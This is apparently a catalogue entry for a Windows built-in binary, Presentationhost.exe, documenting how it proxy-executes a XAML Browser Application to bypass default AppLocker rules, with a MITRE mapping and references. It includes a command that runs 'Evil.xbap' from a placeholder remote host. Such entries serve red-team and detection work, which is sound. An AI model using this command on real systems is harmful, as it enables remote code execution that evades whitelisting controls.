---
Name: 'Presentationhost.exe'
Description: 'Proxy execution of code through XAML Browser Application.'
Created: '2018-06-12'
Commands:
  - Command: 'Presentationhost.exe file:///IPAddressOrDomainName/Evil.xbap'
    Description: 'Executes the target XAML Browser Application (XBAP) file.'
Windows Binary: true
Bypasses Default AppLocker Rules: true
Notes: 'Only works via UNC path and files must not have the Mark of the Web'
MITRE:
  - ID: 'T1218'
    Link: 'https://attack.mitre.org/techniques/T1218/'
Atomic Red Teaming:
  - Description: ''
    Code: ''    
Full path:
  - Path: 'c:\windows\system32\PresentationHost.exe'
  - Path: 'c:\windows\sysWOW64\PresentationHost.exe'
Verified on OS:
  - Windows Server 2016: true
  - Windows 10 1803: true
  - Windows 10 1709: false
  - Windows 10 1703: false
  - Windows 10 1607: false
  - Windows 10 1511: false
  - Windows 10 1507: false
  - Windows 8.1: false
  - Windows 8: false
  - Windows 7: false
Resources:
  - Link: 'https://medium.com/@jpg.inc.au/applocker-bypass-presentationhost-exe-8c87b2354cd4'
  - Link: 'https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf'
  - Link: 'https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/'
Acknowledgement:
  - Name: 'Josh Graham of TSS'
    TwitterHandle: '@JPG1nc'
    Blog: 'https://medium.com/@jpg.inc.au'
  - Name: 'Casey Smith'
    TwitterHandle: '@Subtee'
    Blog: 'https://subt0x11.blogspot.com/'
---
